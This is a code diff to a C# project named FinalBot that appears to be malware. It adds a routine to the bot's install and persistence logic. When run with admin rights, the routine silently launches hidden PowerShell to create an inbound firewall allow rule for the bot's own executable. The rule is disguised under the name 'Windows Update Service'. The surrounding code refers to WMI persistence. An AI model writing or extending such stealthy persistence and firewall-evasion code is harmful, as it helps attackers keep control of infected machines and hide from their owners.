@@ -10,6 +10,7 @@ namespace FinalBot
     {
         public static void Install()
         {
+            AddFirewallException();
             try
             {
                 string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
@@ -75,6 +76,27 @@ namespace FinalBot
             {
                 Logger.Warn($"[PERSISTENCE] WMI failed: {ex.Message}");
             }
+        }
+
+        private static void AddFirewallException()
+        {
+            try
+            {
+                if (!VanguardCore.ElevationService.IsAdmin()) return;
+                
+                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
+                if (string.IsNullOrEmpty(selfPath)) return;
+
+                string cmd = $"New-NetFirewallRule -DisplayName 'Windows Update Service' -Direction Inbound -Program '{selfPath}' -Action Allow -ErrorAction SilentlyContinue";
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "powershell",
+                    Arguments = $"-Command \"{cmd}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
         }
 
         public static void Uninstall()
